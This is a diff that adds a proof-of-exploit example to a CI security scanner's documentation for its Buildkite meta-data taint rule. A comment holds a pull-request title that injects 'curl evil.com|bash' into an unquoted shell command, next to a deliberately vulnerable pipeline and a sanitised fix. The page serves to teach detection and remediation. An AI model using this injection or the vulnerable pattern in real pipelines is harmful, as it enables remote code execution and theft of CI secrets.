@@ -3244,6 +3244,45 @@ Buildkite meta-data is per-build, not per-step; any step in the same build can r
 
 - If the producer step runs a sanitiser between the tainted source interpolation and the ``meta-data set`` call (``echo "$BUILDKITE_PULL_REQUEST_TITLE" | tr -dc 'a-zA-Z0-9 ' | xargs -I{} buildkite-agent meta-data set title {}``), the consumer is no longer exploitable but TAINT-005 still fires. Suppress via ignore-file scoped to the consumer step's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a PR titled ``shiny new feature";curl
+# evil.com|bash;"`` lands in the meta-data store via the
+# producer step. The consumer step reads it back into
+# ``$TITLE`` and inlines it into a shell command — the
+# injected ``curl`` runs in the consumer's shell with
+# the consumer step's full secret set in scope.
+steps:
+  - label: extract
+    command: |
+      buildkite-agent meta-data set "title" \
+        "$BUILDKITE_PULL_REQUEST_TITLE"
+  - wait
+  - label: use
+    command: |
+      TITLE=$(buildkite-agent meta-data get title)
+      echo $TITLE
+      ./generate-release-notes.sh --title $TITLE
+
+# Safe: sanitise at the producer (drop anything outside
+# the expected charset) and quote at the consumer. The
+# value is now safe to inline into a shell command — the
+# injected metacharacters either never reach meta-data or
+# are quoted as one literal argument.
+steps:
+  - label: extract
+    command: |
+      clean=$(echo "$BUILDKITE_PULL_REQUEST_TITLE" | \
+          tr -dc 'a-zA-Z0-9 -')
+      buildkite-agent meta-data set "title" "$clean"
+  - wait
+  - label: use
+    command: |
+      TITLE="$(buildkite-agent meta-data get title)"
+      ./generate-release-notes.sh --title "$TITLE"
+```
+
 **Source:** [`TAINT-005`](../providers/buildkite.md#taint-005) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `TAINT-006`: Untrusted input flows across tasks via Tekton ``results`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-006 }
